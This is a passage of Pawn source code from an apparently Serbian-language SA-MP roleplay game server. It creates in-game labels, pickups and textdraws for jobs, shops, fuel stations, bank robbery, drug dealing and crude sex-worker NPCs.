    Create3DandP(""col_white"Da pogledate rezultate proslog kola kucajte\n"col_crvena"[ /rezultati ]", 2392.2578,2148.4929,1001.0859, -1, -1, 1239, 5.0 );
    Create3DandP(""col_white"Da podignete dobitak kucajte\n"col_crvena"[ /podignitiket ]", 2392.7114,2145.0967,1001.0859, -1, -1, 1239, 5.0 );
	// kurve
	CreateDynamic3DTextLabel(""col_crvena"Lisa: "col_white"Spremna sam za tebe, duso.\nDa krenete kucajte "col_crvena"/blowjob\n"col_crvena"1500$", -1, -2436.4424, 995.2935, -20.5350, 3.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1 );
	CreateDynamic3DTextLabel(""col_crvena"Angelina: "col_white"Zelim da stavim nesto ukusno u usta.\nDa krenete kucajte "col_crvena"/blowjob\n"col_crvena"1500$",-1, -2436.6335, 1006.5629, -20.5350, 3.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1 );
	CreateDynamic3DTextLabel(""col_crvena"Mia: "col_white"Spremna sam za tebe.\nDa krenete kucajte "col_crvena"/blowjob\n"col_crvena"1500$", -1, -2448.6267, 1006.4838, -20.5350, 3.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1 );
	CreateDynamic3DTextLabel(""col_crvena"Sendy: "col_white"Zelis li malo zabave duso?.\nDa krenete kucajte "col_crvena"/blowjob\n"col_crvena"1500$", -1, -2448.4248, 996.1221, -20.5350, 3.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1 );
	//
	// CreateDynamic3DTextLabel("[BANDERA SRECE]\n\nStanite ovde i gledajte banderu\nkada neko donira gradu\nobogaticete se.", -1, 1133.5189, -936.0316, 47.7939, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1 );
	// firme
    Create3DandP(""col_white"Da kupite hranu kucajte\n"col_crvena"[ /menu ]", 378.1259, -67.7236, 1001.5151, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da kupite hranu kucajte\n"col_crvena"[ /menu ]", 369.4863, -6.0172, 1001.8589, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da kupite hranu kucajte\n"col_crvena"[ /menu ]", 450.3892, -83.6542, 999.5547, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da kupite hranu kucajte\n"col_crvena"[ /menu ]", -786.3990, 500.0740, 1371.7422, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da kupite hranu kucajte\n"col_crvena"[ /menu ]", 375.6081, -118.8045, 1001.4995, -1, -1, 1239, 2.0 );

	Create3DandP(""col_white"Da naucite borbeni stil kucajte\n"col_crvena"[ /treniraj ]", 771.0096,13.4834,1000.6988, -1, -1, 1239, 2.0 );
    //Create3DandP(""col_white"Da kupite oruzje kucajte\n"col_crvena"[ /kupioruzje ]", 308.2903,-141.4637,999.6016, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da kupite ilegalne stvari kucajte\n"col_crvena"[ /illegal ]", 1714.9465, -1508.9261, 13.7345, -1, -1, 1239, 3.0 );
	// Cargo
	//Create3DandP("{F3FF02}[ meso ]\n{C3C3C3}1 paket - 10 kg mesa\nCena - 600$", 1938.3569, 165.5013, 37.2813, -1, -1, 1318, 4.0 );
	//Create3DandP("{F3FF02}[ jaja ]\n{C3C3C3}1 paket - 10 jaja\nCena - 350$", 1546.8782, 29.7848, 24.1406, -1, -1, 1318, 4.0 );
	//Create3DandP("{F3FF02}[ pice ]\n{C3C3C3}1 paket - 10 flasa\nCena - 100$", 1324.3235, 286.0972, 20.0452, -1, -1, 1318, 4.0 );
	//Create3DandP("{F3FF02}[ barut ]\n{C3C3C3}1 paket - 10 kg baruta\nCena - 600$", 1054.8197, 2148.1167, 10.8203, -1, -1, 1318, 4.0 );
	//Create3DandP("{F3FF02}[ pamuk ]\n{C3C3C3}1 paket - 10 metar\nCena - 5000$", -1061.3091, -1195.5011, 129.7787, -1, -1, 1318, 4.0 );
    //Create3DandP("{F3FF02}[ hrana ]\n{C3C3C3}1 paket - 10 kg hrane\nCena - 300$", 1918.5342, 172.9674, 37.2623, -1, -1, 1318, 4.0 );
 //    Create3DandP(""col_white"Da utovarite drvece kucajte\n"col_crvena"[ /prevozdrveca ]", -569.0004, -93.3358, 63.9587, -1, -1, 1318, 10.0 );
	// Create3DandP(""col_white"Da utovarite sljunak kucajte\n"col_crvena"[ /prevozsljunka ]", 620.8951, 832.1742, -42.9609, -1, -1, 1318, 10.0 );
	// Create3DandP(""col_white"Da utovarite gorivo kucajte\n"col_crvena"[ /prevozgoriva ]", 2482.1101, -2081.8760, 14.5476, -1, -1, 1318, 10.0 );
	// 24/7 system
	Create3DandP(""col_white"Da kupite stvari iz korpe kucajte\n"col_crvena"[ /buy ]\n"col_white"Da opljackate market\n"col_crvena"[ /robmarket ]", -28.0849,-89.9528,1003.5469, -1, -1, 1239, 2.0 );
	// Poslovi

    for(new i = 1; i < MAX_JOBS; i++) {

        posaoPickup[i] = CreateDynamicPickup( 1274, 1, jobsInfos[i][jPos][0], jobsInfos[i][jPos][1], jobsInfos[i][jPos][2], -1, -1 );
        new string[128];
        format(string, sizeof(string), ""col_crvena"[ %s ]\n"col_white"KVALIFIKACIJE:"col_crvena"NEMA", jobsInfos[i][jName]);
        Create3DTextLabel(string, 0x008080FF, jobsInfos[i][jPos][0], jobsInfos[i][jPos][1], jobsInfos[i][jPos][2], 10.0, 0, 0);
    }

    Create3DandP(""col_white"Da kupite dozvolu za oruzje kucajte\n"col_crvena"[ /kupidozvoluzaoruzje ]", 652.8884,2543.3018,-89.4551, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da uzmete tablice kucajte\n"col_crvena"[ /vehicle uzmitablice ]", 656.0103,2543.3245,-89.4551, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da upalite racunar kucajte\n"col_crvena"[ /computer ]", 664.7603,2553.5720,-89.4551, -1, -1, 1239, 2.0 );

    Create3DandP(""col_white"Da overite papire za registraciju kucajte\n"col_crvena"[ /vehicle registruj ]", -1872.6650,2666.6587,3.5894, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da platite organizacijsku kaznu kucajte\n"col_crvena"[ /platiorgkaznu (50.000$) ]", -1872.6609,2670.5059,3.5904, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da platite promenu imena kucajte\n"col_crvena"[ /promeniime (15.000.000$) ]", -1872.7194,2675.4724,3.5904, -1, -1, 1239, 2.0 );

	Create3DandP(""col_white"Da kupite sat kucajte\n"col_crvena"[ /kupisat ]", 1797.4590,-1240.3735,13.6499, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da prodate vase mleko kliknite\n"col_crvena"[ LMB ]",156.6077, -22.2604, 1.5781, -1, -1, 1318, 5.0 );
    //Create3DandP(""col_white"Da uzmete kantu kucajte\n"col_crvena"[ /uzmikantu ]", -1089.5529, -1254.0573, 129.2188, -1, -1, 1239, 5.0 );
	//Create3DandP(""col_white"Da ostavite pokupljene useve kliknite\n"col_crvena"[ LMB ]", -1100.0110, -1142.8070, 129.2188, -1, -1, 1318, 5.0 );
	//Create3DandP(""col_white"Da uzmete dzak semenki kucajte\n"col_crvena"[ /uzmisemenke ]", -1115.5098, -1246.7819, 129.2188, -1, -1, 1318, 5.0 );
    //Create3DandP(""col_white"Da uzmete/ostavite uniformu kucajte\n"col_crvena"[ /uniforma ]", 2303.6729,-2005.9387,14.2156, -1, -1, 1275, 2.0 );
    Create3DandP(""col_white"Da uzmete/ostavite uniformu kucajte\n"col_crvena"[ /taxi duty ]",  312.5584,1498.3406,-16.5524, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da pogledate listu i lokaciju poslova\n"col_crvena"[ /poslovi ]",  -809.7888,1000.0971,-56.6087, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da izvadite pasos i licnu kartu\n"col_crvena"[ /izvadilicnu /izvadipasos ]", -809.9789,1003.4763,-56.6087, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da uznajmite/odjavite sobu kucajte\n"col_crvena"[ /iznajmisobu /odjavisobu ]",  2217.3083, -1146.4053, 1025.7969, -1, -1, 1239, 5.0 );
    Create3DandP(""col_white"Da probijete sef kucajte\n"col_crvena"[ /postavidinamit /hakujsef ]",  -1699.4025,354.6178,1438.5709, -1, -1, 1239, 5.0 );
    Create3DandP(""col_white"Da opljackate banku kucajte\n"col_crvena"[ /robbank ]", -1698.5164,363.0300,1438.5709, -1, -1, 1239, 5.0);
    Create3DandP(""col_white"Da kupite ilegalne supstance kucajte\n"col_crvena"[ /droga buyilegal ]", 2834.8999,-2360.7681,26.8931, -1, -1, 1239, 5.0 );
	Create3DandP(""col_white"Da kupite kanticu( 200$ ) kucajte\n"col_crvena"[ /kupikanticu ]", -23.5164, -55.6298, 1003.5469, -1, -1, 1239, 10.0 );

    Create3DandP(""col_crvena"[ AFK Zona ]\n"col_white"'ENTER' za izlaz", 1700.5277, -1667.7759, 20.2188, -1, -1, 19197, 10.0 );
	Create3DandP(""col_crvena"[ AFK Zona ]\n"col_white"'ENTER' za ulaz", 1471.4055, -1178.0507, 23.9228, -1, -1, 19197, 10.0 );

    Create3DandP(""col_white"Da udjete u DM zonu kucajte\n"col_crvena"[ /udjinadm ]", 1382.1486, -1088.6586, 28.2120, -1, -1, 1239, 10.0 );
    Create3DandP(""col_white"Da uzmete paket kucajte\n"col_crvena"[ /uzmipaket ]", 2742.1833, -2898.0132, 13.6670, -1, -1, 1239, 10.0 );
    Create3DandP(""col_white"Da uzmete paket kucajte\n"col_crvena"[ /uzmipaket ]", 2590.8518, -496.2301, 87.2604, -1, -1, 1239, 10.0 );
	//

	Create3DandP(""col_white"[ GRANICA - San Fierro ]\n"col_crvena"[ /granica ]", 58.7950,-1525.6416,4.9652, -1, -1, 1239, 20.0);
	Create3DandP(""col_white"[ GRANICA - San Fierro ]\n"col_crvena"[ /granica ]", 44.0856,-1537.7295,5.1893, -1, -1, 1239, 20.0);
	Create3DandP(""col_white"[ GRANICA - Las Venturas ]\n"col_crvena"[ /granica ]", 1803.1553,783.5743,11.5500, -1, -1, 1239, 20.0);
	Create3DandP(""col_white"[ GRANICA - Las Venturas ]\n"col_crvena"[ /granica ]", 1789.0673,788.2881,11.4231, -1, -1, 1239, 20.0);

    Create3DandP(""col_white"[ GRANICA - FLORIDA ]\n"col_crvena"[ /granica ]", 3732.6487,-974.5557,11.1350, -1, -1, 1239, 20.0);
    Create3DandP(""col_white"[ GRANICA - FLORIDA ]\n"col_crvena"[ /granica ]", 3721.5398,-972.7080,11.1350, -1, -1, 1239, 20.0);
	
	// GAS
	new String: gorivostring = str_format(""col_white"Trenutno ima "col_crvena"%dL "col_white"goriva\n"col_white"Da napunis vozilo kucajte\n"col_crvena"[ /fill ]\n"col_white"Da kupite kanticu kucajte\n"col_crvena"[ /kupikanticu ]", ServerInfo[ Gorivo ] );
	
	
	ServerInfo[ GorivoLabel ][ 0 ] = pp_CreateDynamic3DTextLabel( gorivostring, -1, 1004.0070,-939.3102,42.1797, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1 );
	CreateDynamicPickup( 1650, 2, 1004.0070, -939.3102, 42.1797, -1, -1, -1, 50.0, -1, 0);
	
	ServerInfo[ GorivoLabel ][ 1 ] = pp_CreateDynamic3DTextLabel( gorivostring, -1, -90.5515,-1169.4578,2.4079, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1 );
	CreateDynamicPickup( 1650, 2, -90.5515,-1169.4578,2.4079, -1, -1, -1, 50.0, -1, 0);
	
	ServerInfo[ GorivoLabel ][ 2 ] = pp_CreateDynamic3DTextLabel( gorivostring, -1, -1609.7958,-2718.2048,48.5391, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1 );
	CreateDynamicPickup( 1650, 2, -1609.7958,-2718.2048,48.5391, -1, -1, -1, 50.0, -1, 0);
	
	ServerInfo[ GorivoLabel ][ 3 ] = pp_CreateDynamic3DTextLabel( gorivostring, -1, -2029.4968,156.4366,28.9498, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1 );
	CreateDynamicPickup( 1650, 2, -2029.4968,156.4366,28.9498, -1, -1, -1, 50.0, -1, 0);
	
	ServerInfo[ GorivoLabel ][ 4 ] = pp_CreateDynamic3DTextLabel( gorivostring, -1, -2408.7590,976.0934,45.4175, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1 );
	CreateDynamicPickup( 1650, 2, -2408.7590,976.0934,45.4175, -1, -1, -1, 50.0, -1, 0);
	
	ServerInfo[ GorivoLabel ][ 5 ] = pp_CreateDynamic3DTextLabel( gorivostring, -1, -2243.9629,-2560.6477,31.8841, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1 );
	CreateDynamicPickup( 1650, 2, -2243.9629,-2560.6477,31.8841, -1, -1, -1, 50.0, -1, 0);
	
	ServerInfo[ GorivoLabel ][ 6 ] = pp_CreateDynamic3DTextLabel( gorivostring, -1, -1676.6323,414.0262,6.9484, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1 );
	CreateDynamicPickup( 1650, 2, -1676.6323,414.0262,6.9484, -1, -1, -1, 50.0, -1, 0);
	
	ServerInfo[ GorivoLabel ][ 7 ] = pp_CreateDynamic3DTextLabel( gorivostring, -1, 2202.2349,2474.3494,10.5258, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1 );
	CreateDynamicPickup( 1650, 2, 2202.2349,2474.3494,10.5258, -1, -1, -1, 50.0, -1, 0);
	
	ServerInfo[ GorivoLabel ][ 8 ] = pp_CreateDynamic3DTextLabel( gorivostring, -1, 614.9333,1689.7418,6.6968, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1 );
	CreateDynamicPickup( 1650, 2, 614.9333,1689.7418,6.6968, -1, -1, -1, 50.0, -1, 0);
	
	ServerInfo[ GorivoLabel ][ 9 ] = pp_CreateDynamic3DTextLabel( gorivostring, -1, -1328.8250,2677.2173,49.7665, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1 );
	CreateDynamicPickup( 1650, 2, -1328.8250,2677.2173,49.7665, -1, -1, -1, 50.0, -1, 0);
	
	ServerInfo[ GorivoLabel ][ 10 ] = pp_CreateDynamic3DTextLabel( gorivostring, -1, 1545.19, -1352.68, 329.97, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1 );
	CreateDynamicPickup( 1650, 2, 1545.19, -1352.68, 329.97, -1, -1, -1, 50.0, -1, 0);

    ServerInfo[ GorivoLabel ][ 11 ] = pp_CreateDynamic3DTextLabel( gorivostring, -1, 1943.9049,-1772.9781,13.3906, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1 );
    CreateDynamicPickup( 1650, 2, 1943.9049,-1772.9781,13.3906, -1, -1, -1, 50.0, -1, 0);

    ServerInfo[ GorivoLabel ][ 12 ] = pp_CreateDynamic3DTextLabel( gorivostring, -1, 3617.9905,-1113.1862,10.8579, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1 );
    CreateDynamicPickup( 1650, 2, 3617.9905,-1113.1862,10.8579, -1, -1, -1, 50.0, -1, 0);

    ServerInfo[ GorivoLabel ][ 13 ] = pp_CreateDynamic3DTextLabel( gorivostring, -1, 3621.0857,-1123.0642,10.8579, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1 );
    CreateDynamicPickup( 1650, 2, 3621.0857,-1123.0642,10.8579, -1, -1, -1, 50.0, -1, 0);
	
	// PAYSPRAY
	
	
	// Create3DandP(""col_white"Da popravite avion kucajte\n"col_crvena"[ /popraviavion ]\n"col_white"Cena: 500$", 1865.6421, -2390.7712, 14.4759, -1, -1, 1239, 20.0 );
	// Create3DandP(""col_white"Da popravite avion kucajte\n"col_crvena"[ /popraviavion ]\n"col_white"Cena: 500$", -1525.4755, -81.9020, 15.0702, -1, -1, 1239, 20.0 );
	// Create3DandP(""col_white"Da popravite avion kucajte\n"col_crvena"[ /popraviavion ]\n"col_white"Cena: 500$", 1433.4257, 1379.8014, 11.7424, -1, -1, 1239, 20.0 );
	
	
    Create3DandP(""col_white"Da popravite auto kucajte\n"col_crvena"[ /enter ]\n"col_white"Cena: 500$", 1099.1404, -824.9033, 181.2554, -1, -1, 1239, 10.0 );
	Create3DandP(""col_white"Da popravite auto kucajte\n"col_crvena"[ /enter ]\n"col_white"Cena: 500$", 1024.9756, -1030.7930, 32.0257, -1, -1, 1239, 10.0 );
	Create3DandP(""col_white"Da popravite auto kucajte\n"col_crvena"[ /enter ]\n"col_white"Cena: 500$", 488.3819, -1733.0563, 11.1752, -1, -1, 1239, 10.0 );
	Create3DandP(""col_white"Da popravite auto kucajte\n"col_crvena"[ /enter ]\n"col_white"Cena: 500$", 719.8940, -464.8272, 16.3359, -1, -1, 1239, 10.0 );

    Create3DandP(""col_white"Da prodate zlato kucajte\n"col_crvena"[ /prodajzlato ]\n"col_white"Cena 1 grama: 200$", 1081.6985,-1684.3845,13.5749, -1, -1, 1239, 10.0 );
	// Ostalo
	Create3DandP(""col_white"Da ides uzivo u program\n"col_crvena"[ /live ]", 216.9834,1163.6896,459.2804, -1, -1, 1239, 4.0 );
    Create3DandP(""col_white"Da das oglas kucajte\n"col_crvena"[ /ad ]", 229.5878,1146.4447,459.2804, -1, -1, 1239, 4.0 );
    Create3DandP(""col_white"Arrest point\n"col_crvena"[ /uhapsi ]", 1103.0874,-1359.4902,6.2786, -1, -1, 1247, 2.0 ); //PolicijaMilicija
    Create3DandP(""col_white"Arrest point\n"col_crvena"[ /uhapsi ]", 1527.8656,-1480.8500,13.6331, -1, -1, 1247, 2.0 ); //PolicijaMilicija
    Create3DandP(""col_white"GOV Repair\n"col_crvena"[ /govrepair ]", 1134.1757,-1350.2944,6.0208, -1, -1, 1239, 2.0 ); //PolicijaMilicija
    Create3DandP(""col_white"GOV Repair\n"col_crvena"[ /govrepair ]", 1536.3444,-1489.8959,13.6331, -1, -1, 1239, 2.0 ); //PolicijaMilicija

	Create3DandP(""col_white"Da prodate vozilo kucajte\n"col_crvena"[ /vozilo - Prodaja otpad ]", 2262.7529,2036.0621,10.8203, -1, -1, 1239, 4.0 );
	Create3DandP(""col_white"Da polazate testove kucajte\n"col_crvena"[ /kupidozvolu ]", 830.6841,-510.1363,996.6475, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da kupite dozvolu za avion/brod kucajte\n"col_crvena"[ /kupidozvoluzaavion /kupidozvoluzabrod ]", 828.0190,-516.6453,996.6475, -1, -1, 1239, 2.0 );
    Create3DandP(""col_crvena"[ Rudnik ]\n"col_white"'ENTER' za ulaz", 602.1806, 867.9139, -42.9609, -1, -1, 19133, 2.0);
	//Create3DandP(""col_crvena"[ Opstina ]\n"col_white"'ENTER' za ulaz", 1481.4899,-1781.8107,15.3986, -1, -1, 19133, 2.0); //Ovo
    Create3DandP(""col_crvena"[ Zlatara ]\n"col_white"'ENTER' za ulaz", 1081.2454,-1696.7845,13.5469, -1, -1, 19133, 2.0);
    //Create3DandP(""col_crvena"[ Advokatska Redakcija ]\n"col_white"'ENTER' za ulaz", 1786.7190,-1300.0983,13.4493, -1, -1, 19133, 2.0);

    Create3DandP(""col_crvena"[ Promoter baza ]\n"col_white"'ENTER' za ulaz", 1673.9718, 1967.7209, 10.8203, -1, -1, 19133, 2.0);
	Create3DandP(""col_white"Da polazete srednju skolu kucajte\n"col_crvena"[ /lesson ]", 1667.8092,-1379.7235,-48.9541, 1, 1, 1239, 2.0 );
    Create3DandP(""col_white"Da polazete osnovnu skolu kucajte\n"col_crvena"[ /lesson ]", 1664.8800,-1367.4441,-48.9541, 2, 2, 1239, 2.0 );
    Create3DandP(""col_white"Da zavrsite fakultet kucajte\n"col_crvena"[ /lesson ]", 1665.9690,-1392.0660,-48.95411, 3, 3, 1239, 2.0 );
    Create3DandP(""col_white"Da kupite seme droge kucajte\n"col_crvena"[ /droga buyseeds ]", 870.3927, -24.9189, 63.9863, -1, -1, 1239, 2.0 );

    Create3DandP(""col_white"Da kupite mobilni mobilni telefon kucajte\n"col_crvena"[ /kupitelefon ]", 935.1693,-1535.8910,13.5960, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da pogledati listu za prodaju kucajte\n"col_crvena"[ /elkor ]", 936.0370,-1542.2241,13.5960, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da kupite dron kucajte\n"col_crvena"[ /kupidron ]", 934.6881,-1525.1334,13.5960, -1, -1, 1239, 2.0 );

	Create3DandP(""col_white"Da kupite namestaj kucajte\n"col_crvena"[ /namestaj kupi ]", 1004.7539, -1610.4541, 14.5139, -1, -1, 1239, 2.0 );

	Create3DandP(""col_white"[ /mduty ]\n"col_crvena"[ /muniform ]", -2287.8516, 88.6287, -5.3042, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da se izlecite kucajte\n"col_crvena"[ /lek ]", -2322.9973, 110.1389, -5.3942, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da izlecite zavisnost za 25.000$ kucajte\n"col_crvena"[ /izlecizavisnost ]", -2323.0134, 113.0339, -5.3942, -1, -1, 1239, 2.0 );

	Create3DandP(""col_white"[ /droga osusi marihuana ]\n"col_crvena"[ /droga osusi kokain ]", -1477.9165, 2617.5532, 58.7813, -1, -1, 1239, 2.0 );
	Create3DandP(""col_white"[ /droga osusi marihuana ]\n"col_crvena"[ /droga osusi kokain ]", -1478.0580, 2623.5916, 58.7813, -1, -1, 1239, 2.0 );
	Create3DandP(""col_white"[ /droga osusi marihuana ]\n"col_crvena"[ /droga osusi kokain ]", -1478.0391, 2628.3794, 58.7813, -1, -1, 1239, 2.0 );
	Create3DandP(""col_white"[ /droga osusi marihuana ]\n"col_crvena"[ /droga osusi kokain ]", -1478.0297, 2634.2178, 58.7879, -1, -1, 1239, 2.0 );
    //Novi banka
 //    Create3DandP(""col_white"[ /balance /withdraw /deposit ]\n"col_crvena"[ /transfer /podignikredit /kredit ]", -1703.0321,328.0611,1443.5740, -1, -1, 1239, 2.0 );
	// Create3DandP(""col_white"[ /balance /withdraw /deposit ]\n"col_crvena"[ /transfer /podignikredit /kredit ]", -1700.4132,328.0614,1443.5740, -1, -1, 1239, 2.0 );
	// Create3DandP(""col_white"[ /balance /withdraw /deposit ]\n"col_crvena"[ /transfer /podignikredit /kredit ]", -1697.7866,328.0602,1443.5740, -1, -1, 1239, 2.0 );
 //    Create3DandP(""col_white"Da otvorite bankovni racun kucajte\n"col_crvena"[ /otvoriracun ]", -1703.8191,332.6510,1443.5740, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"[ BANKOVNI RACUN ]\n"col_crvena"[ /banka ]", BankaX, BankaY, BankaZ, -1, -1, 1239, 2.0 );
    //
	Create3DandP(""col_white"Da uzmete rezultate narco testa kucajte\n"col_crvena"[ /narcoresults ]", -2292.2214, 104.6003, -5.3468, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Ukoliko zelite da obucete uniformu tjelohranitelja\n"col_crvena"[ /uniformbodyguard ]", 1271.9607, -814.5180, 1089.9375, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Ukoliko zelite da obucete uniformu vozaca\n"col_crvena"[ /uniformdriver ]", 1271.9609, -812.2278, 1089.9375, -1, -1, 1239, 2.0 );
}
//--
//------------------------------------------------------------------------------
public OnGameModeInit( ) { 

    // // Load the SA map
    CA_Init();
    KreirajObjekteTatice( );

    CreateFloridaCity();
    KreirajOstrvo();
    //AddSnowObjects();
    //CreateCity();
    // CreateCityMapSecond();

    createLogin_TD();
    createHappyHoursTD();
    happyJobTDCreate();

    /////////////////////////////////

    PubgPokrenut = false;
    PubgPocelo = false;
    PubgIgraci = 0;
    PubgZonaCount = 0;

    /////////////////////////////////

    matematikaAktivan = false;
    matematikaRezultat = 0;

    aktiviranSnesko = false;

    ////////////////////////////////

    for(new f = 0; f < sizeof(NaftaInfo); f++)
    {
        new fFile[80], string[220];
        format(fFile, 80, PLATFORMA_FILE, f);
        if(fexist(fFile))
        {
            INI_ParseFile(fFile, "UcitajNaftnuPlatformu", .bExtra = true, .extra = f);
            if(strcmp( NaftaInfo[f][pVlasnik], "Niko", true )) {

                format(string, 220, ""PLATFORMACOLOR"[ Naftna Platforma ]\nVlasnik : "col_white"%s\n"PLATFORMACOLOR"ID: "col_white"%d\n"PLATFORMACOLOR"Koristi : "col_white"/platforma", NaftaInfo[f][pVlasnik], f);
                NaftaLabel[f] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, NaftaInfo[f][pUlazX], NaftaInfo[f][pUlazY], NaftaInfo[f][pUlazZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, STREAMER_3D_TEXT_LABEL_SD, -1, 0);
                NaftaPickup[f] = CreateDynamicPickup(1252, 1, NaftaInfo[f][pUlazX], NaftaInfo[f][pUlazY], NaftaInfo[f][pUlazZ], -1, -1, -1, STREAMER_PICKUP_SD, -1, 0);


            }
            else if(!strcmp( NaftaInfo[f][pVlasnik], "Niko", true )) {

                format(string, 220, ""PLATFORMACOLOR"[ Naftna Platforma ]\nVlasnik : "col_white"NIKO\n"PLATFORMACOLOR"ID: "col_white"%d\n"PLATFORMACOLOR"Cena: "col_white"%d$\n"PLATFORMACOLOR"Da kupis naftnu platformu koristi /kupiplatformu", f, NAFTNAPLATFORMA_PRICE);
                NaftaLabel[f] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, NaftaInfo[f][pUlazX], NaftaInfo[f][pUlazY], NaftaInfo[f][pUlazZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, STREAMER_3D_TEXT_LABEL_SD, -1, 0);
                NaftaPickup[f] = CreateDynamicPickup(18631, 1, NaftaInfo[f][pUlazX], NaftaInfo[f][pUlazY], NaftaInfo[f][pUlazZ], -1, -1, -1, STREAMER_PICKUP_SD, -1, 0);
            }
        }
    }

    /////////////////////////////////

    for(new slutID = 1; slutID < sizeof(slutInfo); slutID++) {

        new fFile[80];
        format(fFile, 80, SlutsFile, slutID);
        if(fexist(fFile)) {

            INI_ParseFile(fFile, "LoadSluts", .bExtra = true, .extra = slutID);
            new String: string = str_format(""SRVBOJA1SCM"Kurva ID: %d\n"col_red"Koristi : /slut", slutID);
            slutActor[slutID] = CreateDynamicActor(178, slutInfo[slutID][slutPosX], slutInfo[slutID][slutPosY], slutInfo[slutID][slutPosZ], 0, 1, 100, 0, 0, -1, 40.0, -1, 0);
            slutLabel[slutID] = pp_CreateDynamic3DTextLabel(string, 0x33CCFFAA, slutInfo[slutID][slutPosX], slutInfo[slutID][slutPosY], slutInfo[slutID][slutPosZ]+1.0, 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);
            slutMapIcon[slutID] = CreateDynamicMapIcon(slutInfo[slutID][slutPosX], slutInfo[slutID][slutPosY], slutInfo[slutID][slutPosZ], 12, BELA, -1, -1, -1, 300.0);
            slutRadi[slutID] = false;
        }
    }

    /////////////////////////////////
    createPaparazo();

    /////////////////////////////////

    RolexUToku = false;
    RolexBioSkoro = false;
    rolexRobaOrg = 0;
    opljackaniRafovi = 0;

    RolexCuvar = CreateActor(163, 1807.0728,-1238.0975,13.6499,133.5556);
    SetActorInvulnerable(RolexCuvar, 0);

    /////////////////////////////////

    aktivanKviz = false;
    kvizResenje = 0;

    ////////////////////////// PORTOVI
    for(new id = 0; id < MAX_PORTING; id++)
    {
        new wFile[40];
        format(wFile, 40, PORTING_FILE, id);
        if(fexist(wFile))
        {
            INI_ParseFile(wFile, "UcitajPortove", .bExtra = true, .extra = id);
        }
    }

    deathCount = 0;
    killerList[0] = victimList[0] = EOS;

    tdDeathList[0] = TextDrawCreate(555.735290, 289.970428, "_");
    TextDrawLetterSize(tdDeathList[0], 0.168999, 1.056592);
    TextDrawAlignment(tdDeathList[0], 3);
    TextDrawColor(tdDeathList[0], -1);
    TextDrawSetShadow(tdDeathList[0], 0);
    TextDrawSetOutline(tdDeathList[0], -1);
    TextDrawBackgroundColor(tdDeathList[0], 255);
    TextDrawFont(tdDeathList[0], 1);
    TextDrawSetProportional(tdDeathList[0], 1);

    tdDeathList[1] = TextDrawCreate(564.203735, 289.970428, "_");
    TextDrawLetterSize(tdDeathList[1], 0.168999, 1.056592);
    TextDrawTextSize(tdDeathList[1], 0.000000, 500.000000);
    TextDrawAlignment(tdDeathList[1], 2);
    TextDrawColor(tdDeathList[1], -16776961);
    TextDrawSetShadow(tdDeathList[1], 0);
    TextDrawSetOutline(tdDeathList[1], -1);
    TextDrawBackgroundColor(tdDeathList[1], 255);
    TextDrawFont(tdDeathList[1], 1);
    TextDrawSetProportional(tdDeathList[1], 1);

    tdDeathList[2] = TextDrawCreate(571.401977, 289.970428, "_");
    TextDrawLetterSize(tdDeathList[2], 0.168999, 1.056592);
    TextDrawTextSize(tdDeathList[2], 500.000000, 0.000000);
    TextDrawAlignment(tdDeathList[2], 1);
    TextDrawColor(tdDeathList[2], -1);
    TextDrawSetShadow(tdDeathList[2], 0);
    TextDrawSetOutline(tdDeathList[2], -1);
    TextDrawBackgroundColor(tdDeathList[2], 255);
    TextDrawFont(tdDeathList[2], 1);
    TextDrawSetProportional(tdDeathList[2], 1);

    //Hakovanje Banke
